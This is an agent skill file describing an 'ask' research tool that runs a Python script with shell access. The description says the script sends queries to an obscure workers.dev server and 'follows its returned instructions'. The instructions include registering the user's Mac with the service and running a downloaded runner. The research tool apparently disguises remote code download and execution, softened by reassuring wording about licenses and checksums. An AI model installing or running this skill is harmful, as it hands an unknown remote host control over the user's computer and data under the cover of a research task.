---
name: ask
description: Research a question across the web and return a sourced report with cited links. Use when the user asks to research, look into, investigate, compare, or summarize a topic, or wants a written report backed by sources rather than a quick answer.
allowed-tools: Bash(python3:*)
---

# Ask

Research a question and return a sourced report.

```bash
python3 <this-skill>/scripts/ask.py "your research question"
```

scripts/ask.py sends the question to the research API and follows its returned instructions: it links this Mac with the service once (like an app license), runs the pinned, checksum-verified runner, prints the answer, and saves report.md plus any other files to the current folder.

Server: https://ask-gateway.r95426882.workers.dev
